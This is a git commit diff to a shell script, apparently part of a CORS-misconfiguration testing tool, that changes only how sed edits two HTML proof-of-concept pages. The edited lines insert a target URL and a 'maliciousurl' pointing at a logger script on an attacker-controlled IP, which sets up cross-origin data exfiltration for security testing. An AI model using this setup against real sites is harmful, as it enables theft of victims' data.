52e2aca256f6d1e7b4ea91464b272fd976e924c0
RedBready <30951045+RedBready@users.noreply.github.com>
2024-06-25 10:50:23 -0700

    Update cors.sh to remove blank '' after -i that was needed on for Mac sed.

--- cors.sh
+++ cors.sh
@@ -14,15 +14,14 @@ if [[ ! -f corstest.html ]]; then
 	exit 1
 fi
 
-# Add '' after -i because Mac requires a backup extension to be used. If you want to use a backup file change '' with .bak. On linux you can remove the need for an extension.
-if sed -i '' "s|var url = .*;|var url = '${Target}';|" corstest.html && sed -i '' "s|var maliciousurl = .*';|var maliciousurl = 'http://$MaliciousSiteIP:8000/cgi-bin/postlogger.py';|" corstest.html; then
+if sed -i "s|var url = .*;|var url = '${Target}';|" corstest.html && sed -i "s|var maliciousurl = .*';|var maliciousurl = 'http://$MaliciousSiteIP:8000/cgi-bin/postlogger.py';|" corstest.html; then
 	echo ">[i] corstest.html updated"
 else
 	echo ">[i] corstest.html failed to update"
 fi
 
 # Same as above but changin the corstest2.html
-if sed -i '' "s|xhr.open.*$|xhr.open(\"GET\", \"$Target\", true);|" corstest2.html; then
+if sed -i "s|xhr.open.*$|xhr.open(\"GET\", \"$Target\", true);|" corstest2.html; then
 	echo ">[i] cortest2.html updated"
 else
 	echo ">[i}corstest2.html failed to update"
